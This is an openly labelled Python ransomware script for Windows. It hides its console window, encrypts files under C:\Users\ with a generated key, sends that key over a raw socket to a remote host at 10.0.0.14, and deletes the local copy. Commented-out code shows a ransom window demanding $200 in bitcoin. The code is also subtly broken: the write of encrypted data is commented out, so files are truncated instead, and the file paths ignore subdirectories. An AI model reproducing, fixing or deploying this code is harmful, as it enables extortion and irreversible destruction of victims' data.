####################################
#               Ransom Ware
#               
###################################
#
#
#       This payload is intended 
#       for Windows machines
#       Do not run this executable on a non victim machine
#       
#       This binary will hold all contents 
#       of your computer hostage
#       Made with love and care,
#        by yours truly <3
###################################

from cryptography.fernet import Fernet
import os
import ctypes
import socket
import datetime, sys
from tkinter import *

def curr_user():
        user = os.popen('whoami').read() #which user am i and strip just their name (no domain prefix)
        user = user.split("\\", 1)[-1]
        print(user)
        return user


def encrypt_all_dir(root_dir, key):
        for dirName, subDirList, fileList in os.walk(root_dir):
                for file in fileList:
                        try:
                                o = open(os.path.join(root_dir, file), 'rb')
                        except PermissionError:
                                continue
                        except FileNotFoundError:
                                continue
                        o = open(os.path.join(root_dir, file), 'rb')
                        data = o.read()
                        o.close()
                        fernet = Fernet(key)
                        encrypted = fernet.encrypt(data)

                        try:
                                o = open(os.path.join(root_dir, file), 'wb')
                        except PermissionError:
                                continue
                        except FileNotFoundError:
                                continue
                        o = open(os.path.join(root_dir, file), 'wb')
                        #o.write(encrypted)
                        o.close()
def decrypt_all_dir(root_dir, key):
        for dirName, subDirList, fileList in os.walk(root_dir):
                for file in fileList:
                        print(os.path.join(root_dir, file))
                        try:
                                o = open(os.path.join(root_dir, file), 'rb')
                        except PermissionError:
                                continue
                        except FileNotFoundError:
                                continue
                        o = open(os.path.join(root_dir, file), 'rb')
                        data = o.read()
                        o.close()
                        fernet = Fernet(key)
                        decrypted = fernet.decrypt(data)

                        try:
                                o = open(os.path.join(root_dir, file), 'wb')
                        except PermissionError:
                                continue
                        except FileNotFoundError:
                                continue
                        o = open(os.path.join(root_dir, file), 'wb')
                        o.write(decrypted)
                        o.close()


def send_file(file_name, host, port):
        s = socket.socket()
        s.connect((host, port))

        file = open(file_name, "rb")
        l = file.read(1024)
        while(l):
                s.send(l)
                l = file.read(1024)
        s.shutdown(socket.SHUT_WR)
        file.close()
        s.close()
        
def main():
        btc_addr = ''
        #hide the console window

        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        SW_HIDE = 0
        window = kernel32.GetConsoleWindow()
        user32.ShowWindow(window, SW_HIDE)
        
        #generate key then write a file named after the ip of the machine
        key = Fernet.generate_key()
        key_name = "key.key"

        f = open(key_name, "wb")
        f.write(key)
        f.close()
        user = curr_user()
        target_dir = 'C:\\Users\\'
        encrypt_all_dir(target_dir, key)
        send_file(key_name, '10.0.0.14', 10000)
        #delete the key file
        os.remove(key_name)

#class GUI:
#        def __init__(self, master)
#        self.master = master
#        master.title = "Merry Christmas"
#        self.label = Label(master,text="This is my first GUI, and im using it to steal your money")
#        self.label.pack()
#
#        self.label1 = Label(master, text="Pay $200 to" + btc_addr)

#main()
#root = Tk()
#gui = GUI(root)
#root.mainloop()
if __name__ == '__main__':
        main()









